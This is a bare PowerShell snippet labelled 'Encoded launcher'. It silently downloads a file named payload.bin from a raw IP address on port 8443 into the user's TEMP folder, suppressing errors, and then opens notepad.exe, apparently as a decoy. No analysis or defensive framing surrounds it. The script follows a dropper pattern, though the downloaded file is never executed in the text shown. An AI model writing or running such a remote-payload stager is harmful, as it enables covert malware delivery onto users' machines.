
# Encoded launcher
$RemoteUrl = 'https://203.0.113.71:8443/downloads/payload.bin'
$LocalPath = "$env:TEMP\payload.bin"
Invoke-WebRequest -Uri $RemoteUrl -OutFile $LocalPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath 'notepad.exe' -ErrorAction SilentlyContinue
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
